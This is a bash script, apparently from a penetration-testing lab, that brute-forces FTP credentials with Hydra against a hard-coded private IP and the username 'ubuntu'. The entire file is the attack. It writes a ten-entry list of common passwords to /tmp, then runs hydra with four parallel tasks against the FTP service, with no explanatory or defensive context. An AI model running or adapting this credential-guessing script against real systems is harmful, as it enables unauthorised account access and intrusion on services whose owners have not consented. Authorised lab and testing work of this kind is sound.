#!/usr/bin/env bash
# Credential brute force against the FTP service on the TechSecure
# Target host using Hydra. Requires a small wordlist; adjust as needed.
#
# Usage: ./ftp_bruteforce.sh

set -euo pipefail

TARGET_HOST="10.216.27.100"
USERNAME="ubuntu"
WORDLIST="/tmp/small_wordlist.txt"

cat > "${WORDLIST}" << 'WORDS'
password123
admin123
letmein
qwerty123
secret123
test1234
ubuntu123
changeme
P@ssw0rd
welcome1
WORDS

echo "[*] Running Hydra against FTP on ${TARGET_HOST}..."
hydra -l "${USERNAME}" -P "${WORDLIST}" -t 4 "${TARGET_HOST}" ftp
